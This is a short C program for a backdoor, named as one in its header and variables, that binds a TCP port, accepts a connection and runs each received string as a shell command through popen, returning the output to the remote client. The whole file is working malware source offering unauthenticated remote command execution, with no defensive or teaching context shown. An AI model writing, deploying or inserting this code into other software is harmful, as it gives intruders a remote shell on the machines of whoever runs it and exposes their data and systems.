#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include "backdoor.h"

int main(int argc, char *argv[]){

    struct sockaddr_in backdoor;
    struct sockaddr_in client;

    int bytes;
    int size = sizeof(struct sockaddr_in);

    char cmd[1024];

    int sockfd_server = create_socket();
    int sockfd_client = create_socket();

    memset(&backdoor, 0, sizeof(backdoor));

    backdoor.sin_family = AF_INET;
    backdoor.sin_port = htons(SERVER_PORT);
    backdoor.sin_addr.s_addr = inet_addr(SERVER_ADDR);

    if(bind(sockfd_server, (struct sockaddr *)&backdoor, sizeof(struct sockaddr)) < 0){
        perror("bind");
        exit(1);
    }

    printf("[+]Bind successfully created\n");
 
    if(listen(sockfd_server, SERVER_BACKLOG)){
        perror("listen");
        exit(1);        
    }

    
    printf("[+]listening...\n");
    printf("[+]Server: %s\n", SERVER_ADDR);
    printf("[+]Port: %d\n", SERVER_PORT);
    

    if((sockfd_client = accept(sockfd_server, (struct sockaddr *) &client, &size)) < 0){
        perror("socket");
        exit(1);
    }


    while(1){
        
        memset(cmd, 0, sizeof(cmd));

        if((bytes = recv(sockfd_client, cmd, 50, 0)) < 0){
            perror("recv");
            exit(1);
        }

        cmd[bytes] = '\0';

        FILE *exec = popen(cmd, "r");
        char output[1024];

        memset(&output, 0, sizeof(output));

        while(fgets(output, sizeof(output), exec) != 0){
            printf("%s", output);
            send(sockfd_client, output, sizeof(output), 0);
        }
    }

    return 0;
}
